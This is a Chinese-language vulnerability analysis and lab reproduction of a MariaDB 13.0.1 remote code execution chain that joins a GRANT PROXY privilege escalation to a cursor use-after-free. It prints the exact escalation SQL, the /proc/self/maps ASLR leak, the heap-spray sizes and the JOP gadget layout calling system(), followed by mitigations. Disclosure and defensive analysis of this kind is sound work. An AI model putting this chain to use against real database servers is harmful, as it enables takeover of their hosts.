# MariaDB 远程代码执行漏洞分析复现
> 来源：https://xz.aliyun.com/news/92636

## 漏洞概述

  
在 MariaDB 13.0.1 存在远程代码执行攻击链。攻击者仅需一个低权限数据库账号（USAGE 级别）和 TCP 网络可达性，即可通过纯 SQL 语句在服务器端以 `uid=999(mysql)` 身份执行任意系统命令。  
  
攻击链由两个 0day 漏洞串联组成：  
  

| 漏洞编号 | 类型 | 说明 |
| --- | --- | --- |
| F-09 | 权限提升 | GRANT PROXY ... IDENTIFIED VIA '' 绕过权限检查，任意用户可劫持 root 账户 |
| F-05 | Use-After-Free | SYS_REFCURSOR 游标数组重分配导致悬挂指针，堆喷后控制虚函数调用 |

  
两个漏洞均在 2026-08-03 仍未修复（上游 `sql/sp_cursor.{cc,h}` 在 13.0.1 tag 和 HEAD 之间零提交）。  
  

## 影响版本

  
●MariaDB 13.0.1（已验证）  
  
● F-09 权限提升：所有已发布版本（验证 13.0.1 至 10.6.27），修复补丁 `dbd60d0ad8d` (MDEV-40470) 仅在 dev 分支  
● F-05 UAF：影响包含 `SYS_REFCURSOR` 功能的所有版本  

## 漏洞严重性

  
CVSS 3.1: 9.8 (Critical) — AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  
  
●攻击向量：网络  
  
●攻击复杂度：低（完全自动化，Python 脚本一键利用）  
  
●权限要求：低（仅需 USAGE 权限的数据库账户）  
  
●用户交互：无  
  
●影响范围：容器/主机系统命令执行  
  

## 利用前置条件

  
攻击者需要满足以下条件才能成功利用此漏洞链：  
  

### 必需条件（全部满足才可触发 RCE）

  

| 条件 | 说明 | 默认/常见情况 |
| --- | --- | --- |
| 网络可达 | 攻击者能建立到 MariaDB 3306 端口的 TCP 连接 | 生产环境常见（应用服务器 → 数据库） |
| 有效数据库账户 | 拥有任意一个 MariaDB 账户（包括仅 USAGE 权限的最低权限账户） | 多租户环境、共享数据库实例 |
| secure_file_priv = NULL（未设置） | 允许 LOAD DATA INFILE 读取任意文件，包括 /proc/self/maps | MariaDB 官方 Docker 镜像默认值；部分发行版打包可能设为 /var/lib/mysql-files 或空字符串 |
| glibc 运行环境 | 漏洞利用依赖 glibc 的 mmap 行为（大块内存分配复用地址）和堆分配器行为（chunk 大小匹配） | MariaDB 官方 Linux 构建均基于 glibc |
| x86_64 架构 | JOP 小工具偏移和 call *0x100(%rax) 等指令基于 x86_64 | 绝大多数生产部署 |
| /proc 文件系统可读 | LOAD DATA INFILE '/proc/self/maps' 依赖 Linux /proc 伪文件系统泄露内存布局 | 所有标准 Linux 环境。容器中需要未设置 security_opt: no-new-privileges + /proc 未做特殊隔离 |
| max_allowed_packet 可调大 | 需要 SET GLOBAL max_allowed_packet = 268435456（256 MiB）来容纳 128 MiB 用户变量。这要求攻击者持有 SUPER 权限……但 F-09 提权已将低权限用户提升为 root，所以此条件自动满足 | F-09 提权后自动达成 |

  

### 非必需但利于利用的条件

  

| 条件 | 说明 | 默认/常见情况 |
| --- | --- | --- |
| SYS_PTRACE capability（容器环境） | 允许读取 /proc/self/maps。Docker 中通常默认可用 | Docker 默认不限制 |
| 容器内 mariadbd 为 PID 1 | exploit 执行 system() 后进程崩溃 → 容器自动退出（但不影响命令已执行的事实） | 官方镜像默认 |
| ASLR 开启 | 实际上ASLR 开启反而是利用条件之一，因为 /proc/self/maps 恰好能泄露随机化后的地址。如果 ASLR 关闭，利用更简单（固定地址） | Linux 默认开启 |

  

### 攻击场景

  
1 共享数据库实例：云数据库服务中，多个租户共享同一 MariaDB 实例，低权限账户通过此漏洞逃逸到宿主系统  
2 应用服务器沦陷：Web 应用 SQL 注入获取的低权限数据库账户，进一步转化为服务器 RCE  
3 内网横向移动：已进入内网的攻击者，利用数据库服务器作为跳板执行命令  
4 容器逃逸辅助：容器内以 mysql 身份执行命令后，可进一步利用内核漏洞逃逸到宿主机  

### 不受影响的情况

  
● `secure_file_priv` 已设置为特定目录或空字符串（阻止 `/proc/self/maps` 读取 — 但攻击者可能通过其他侧信道泄露地址）  
●使用 musl libc 的构建（如 Alpine Linux）— mmap 和堆行为不同  
  
●ARM/aarch64 架构 — JOP 小工具偏移不同  
  
● MariaDB 10.5 以下版本（`SYS_REFCURSOR` 功能可能不存在或实现不同）  

## 复现环境

  

| 组件 | 版本/配置 |
| --- | --- |
| 宿主机 | macOS 15.7.4 |
| Docker | 28.1.1 |
| MariaDB 镜像 | mariadb@sha256:ef34af04bda12e6c85395328af78d562176c34fb29ae52063a4eb0d68fa7b3e9 |
| mariadbd | 13.0.1-MariaDB-ubu2604 |
| 低权限用户 | lowpriv / lowpriv（仅 USAGE + appdb.* 权限） |
| glibc | 容器内置（Ubuntu 26.04） |
| Python | 3.13 + mariadb 客户端 |

  

## 复现步骤

  

### 1\. 启动实验环境

  

```bash
cd ~/data/github/mariadb-13-rce-lab
docker compose up -d
```

`docker-compose.yml`:  
  

```yaml
services:
  mariadb:
    image: mariadb@sha256:ef34af04bda12e6c85395328af78d562176c34fb29ae52063a4eb0d68fa7b3e9
    container_name: mariadb-rce-lab
    environment:
      MARIADB_ROOT_PASSWORD: labpass
      MARIADB_DATABASE: appdb
      MARIADB_USER: lowpriv
      MARIADB_PASSWORD: lowpriv
    ports:
      - "3307:3306"
    cap_add:
      - SYS_PTRACE
    volumes:
      - ./setup.sql:/docker-entrypoint-initdb.d/setup.sql
```

初始化 SQL（`setup.sql`）— lowpriv 用户仅有最低权限：  
  

```sql
GRANT USAGE ON *.* TO 'lowpriv'@'%';
GRANT ALL ON appdb.* TO 'lowpriv'@'%';
```

### 2\. 运行 Pure-SQL 漏洞利用

  

```bash
python3 exploit_pure_sql.py \
    --host 127.0.0.1 --port 3307 \
    --user lowpriv --password lowpriv \
    --command "id > /tmp/pwned" \
    --marker /tmp/pwned \
    --container mariadb-rce-lab
```

### 3\. 复现结果

  

```
[*] MariaDB 13.0.1-rc RCE — PURE SQL variant (lowpriv account only)
[*] Target: lowpriv@127.0.0.1:3307  command: id > /tmp/pwned

[*] Step 1: F-09 GRANT PROXY privilege escalation (lowpriv -> root)
[+] F-09 done — connecting as root with empty password

[*] Step 2: creating spray128 / grow5 / uaf5 (F-05 UAF trigger)
[+] functions created

[*] Step 3: reading /proc/self/maps from SQL (ASLR defeat)
[+] PIE base  0x5587b50bd000
[+] libc base 0x7f4772c00000
[+] D2=0x5587b58caa77  D1=0x5587b5eed75b  system=0x7f4772c5c560

[*] Step 4: allocating 128 MiB @fake marker buffer
[+] @fake region 0x774707c00000  V (fake vtable) = 0x774707c01030

[*] Step 5: writing JOP layout via SQL (self-reference baked) ...
[+] slot stable: V = 0x774707c01030 (self-reference consistent)
[+] reclaim payload ready (V=0x774707c01030 at offset 0x20)

[*] ============ FIRING (CALL uaf5) ============
[*] session died as expected after RCE: no sentinel within 10s; got: b''
[*] waiting for marker /tmp/pwned ...
[+] /tmp/pwned: uid=999(mysql) gid=999(mysql) groups=999(mysql)

[+] ===========================================
[+]  RCE CONFIRMED (pure SQL, lowpriv account)
[+] ===========================================
```

`/tmp/pwned` 内容确认命令以 `uid=999(mysql)` 身份执行成功。  
  

![image.png](https://i.im.ge/QMVpYuW/p2m-e77a669eef.png)

  
  

## 漏洞利用链详细分析

  

### 第一阶段：F-09 权限提升（任意用户 → DBA）

  
漏洞位置： `sql/sql_acl.cc` 中的 `GRANT PROXY` 处理逻辑  
  
利用语句：  
  

```sql
GRANT PROXY ON CURRENT_USER() TO 'root'@'%' IDENTIFIED VIA '';
GRANT PROXY ON CURRENT_USER() TO 'root'@'localhost' IDENTIFIED VIA '';
```

原理：  
  
● `LEX_USER::has_auth()` 方法在认证子句为空字符串时返回 `false`  
● 这使得 `check_alter_user()` 权限检查被跳过  
● 但 `replace_user_table()` 仍会将空密码写入 `mysql.global_priv` 表，替换 root 的原有密码  
●结果：一句 SQL，任意已认证用户即可将 root 密码改为空，获得完整 DBA 权限  
  
严重性： 影响所有已发布 MariaDB 版本。修复补丁（`dbd60d0ad8d`, MDEV-40470）仅存在于开发分支。  
  

### 第二阶段：ASLR 绕过（服务器端文件读取）

  
技术： `LOAD DATA INFILE` 读取 `/proc/self/maps`  
  

```sql
CREATE TABLE appdb.maps_pre (l TEXT);
LOAD DATA INFILE '/proc/self/maps' INTO TABLE appdb.maps_pre;
```

原理：  
  
● MariaDB 默认镜像 `secure_file_priv` 为 NULL（未设置），允许读取任意文件  
● `/proc/self/maps` 直接泄露 mariadbd 进程的完整内存布局  
●提取 PIE 基址（mariadbd 可执行段）和 libc 基址（libc.so.6）  
  
●每次运行的 ASLR 基址不同，但通过 SQL 实时获取，实现真正的 ASLR 击败  
  

### 第三阶段：JOP 链内存布局（纯 SQL 方式）

  
技术： 128 MiB 用户变量分配 + `/proc/self/maps` 差分地址发现  
  

```sql
-- 标记缓冲区：分配 128 MiB 并发现其地址
SET @fake = REPEAT(CHAR(0xDE), 134217728);

-- 重新读取 /proc/self/maps，与之前差分
-- 找到新增的 0x8001000 大小的匿名 rw-p 区域
LOAD DATA INFILE '/proc/self/maps' INTO TABLE appdb.maps_post;
```

地址发现与自引用解决：  
  
1分配 128 MiB 标记缓冲区 → glibc 分配专用 mmap 区域  
  
2 通过 SQL 端 `/proc/self/maps` 差分获取缓冲区地址  
3 重新分配缓冲区，嵌入完整 JOP 布局（含自引用指针 `V+0xa8 = V+0x140`）  
4glibc 释放旧块后复用相同 mmap 槽位 → 地址稳定  
  
JOP 假 vtable 布局（位于缓冲区 V 处）：  
  

```
偏移     内容                    用途
─────────────────────────────────────────────────────
V+0x20   D2  (PIE+0x80da77)     result->prepare() 虚表槽
V+0xa0   system() (libc+0x5c560) JOP 目标函数
V+0xa8   V+0x140                 rdi = 命令字符串指针
V+0x100  D1  (PIE+0xe3075b)     JOP 调度器
V+0x140  "sh -c 'id > /tmp/pwned'\0"  执行的命令
```

两个 JOP 小工具（来自未修改的 mariadbd 二进制）：  
  

| 小工具 | 偏移 | 汇编指令 | 用途 |
| --- | --- | --- | --- |
| D2 | PIE+0x80da77 | call *0x100(%rax) | 栈对齐修正（movaps） |
| D1 | PIE+0xe3075b | mov rdi,[rax+0xa8]; call [rax+0xa0] | 加载命令指针到 rdi，调用 system() |

  

### 第四阶段：F-05 SYS\_REFCURSOR Use-After-Free

  
漏洞位置： `sql/sp_cursor.cc` — `sp_cursor_array::get_cursor_by_ref()`  
  
漏洞原理：  
  
1 `sp_cursor_array` 使用 `Dynamic_array` 存储游标对象（每个 112 字节）  
2默认容量 16 个游标 → 底层存储 16×112 = 1792 字节  
  
3 `get_cursor_by_ref()` 返回指向 `Dynamic_array` 内部存储的指针  
4 当游标的 `open()` 方法执行攻击者控制的 SQL（打开更多游标），数组增长触发 `my_realloc`  
5 `my_realloc` 释放旧存储 → 调用者持有的指针变成悬挂指针  
堆喷回收（heap spray）：  
  
●128 个用户变量副本，每个精确匹配 1784 字节  
  
●精确适配 glibc 释放的 1792 字节 chunk  
  
● 假 vtable 指针 V 放置在偏移 0x20（`sp_cursor` 的 `result` 成员位置）  
虚函数调用劫持：  
  

```
Materialized_cursor::open()
  → result->prepare()
    → mov rax, [result]       ; rax = 攻击者控制的假 vtable 指针 V
    → call [rax + 0x20]       ; 调用 D2 小工具 (prepare 虚表槽)
```

JOP 链执行流：  
  

```
D2: call *0x100(%rax)      ; rax 仍为 V, V+0x100 = D1
D1: mov rdi, [rax+0xa8]    ; rax = V, V+0xa8 = V+0x140 (命令字符串指针)
    call [rax+0xa0]        ; V+0xa0 = system()
                           ; rdi = "sh -c 'id > /tmp/pwned'"
                           ; → system("sh -c 'id > /tmp/pwned'")
```

服务器崩溃： system() 返回后，由于进程内存已损坏，mariadbd 崩溃（PID 1 退出 → 容器停止）。这是预期行为。  
  

## 漏洞利用脚本说明

  
两个利用脚本位于 `~/data/github/mariadb-13-rce-lab/`：  
  

| 脚本 | 类型 | 攻击条件 |
| --- | --- | --- |
| exploit_pure_sql.py | 纯 SQL（推荐） | 低权限账号 + TCP |
| exploit.py | 宿主机辅助 PoC | root + /proc/PID/mem |

  
pure-SQL 变体的创新点：  
  

| 传统方式（exploit.py） | 纯 SQL 替代方案 |
| --- | --- |
| docker inspect → PID + /proc/<pid>/maps | LOAD DATA INFILE '/proc/self/maps' |
| /proc/<pid>/mem 写入 JOP 链 | CONCAT/UNHEX 在分配时嵌入；SQL 端 maps 差分发现地址；mmap 槽复用保持自引用有效 |
| docker exec ... echo CMD | 命令字符串直接嵌入 JOP 布局 |
| root 密码连接 | GRANT PROXY 从低权限账号提权 |

  

## 修复建议

  

### 短期措施（缓解）

  
1 设置 `secure_file_priv` 为空字符串或安全目录，阻止 `LOAD DATA INFILE '/proc/self/maps'`  

```sql
SET GLOBAL secure_file_priv = '/var/lib/mysql-files';
```

2 限制 `max_allowed_packet` 为合理值（如 16M），阻止超大用户变量分配  

```sql
SET GLOBAL max_allowed_packet = 16777216;
```

3 限制 `max_open_cursors` 降低游标数组重分配触发可能  

```sql
SET GLOBAL max_open_cursors = 10;
```

  
4 禁用 SYS\_PTRACE capability（容器环境），移除 `cap_add: SYS_PTRACE`  
5 网络隔离：MariaDB 端口仅监听内网，不暴露到公网  

### 根本修复

  
1F-09 权限提升修复：  
  
○ 合入 MDEV-40470 补丁 (`dbd60d0ad8d`)  
○ 确保 `GRANT PROXY ... IDENTIFIED VIA ''` 时 `has_auth()` 正确触发权限检查  
○ 建议在 `replace_user_table()` 前增加 `IDENTIFIED VIA ''` 的特殊拒绝逻辑  
2F-05 SYS\_REFCURSOR UAF 修复：  
  
○ 修改 `sp_cursor_array::get_cursor_by_ref()` 返回索引而非原始指针  
○ 或在 `open()` 期间锁定 `Dynamic_array` 防止重分配  
○ 建议重构 `Dynamic_array` 使用稳定指针（如 `std::deque` 或 index-based access）  
3纵深防御：  
  
○ 审计 `LOAD DATA INFILE` 对 `/proc`、`/sys`、`/dev` 等敏感路径的访问控制  
○ 对用户变量大小增加硬限制，与 `max_allowed_packet` 解耦  

## 参考链接

  
[https://github.com/MariaDB/server/releases](https://github.com/MariaDB/server/releases)  
  
[https://github.com/dinosn/mariadb-13-rce-lab](https://github.com/dinosn/mariadb-13-rce-lab)
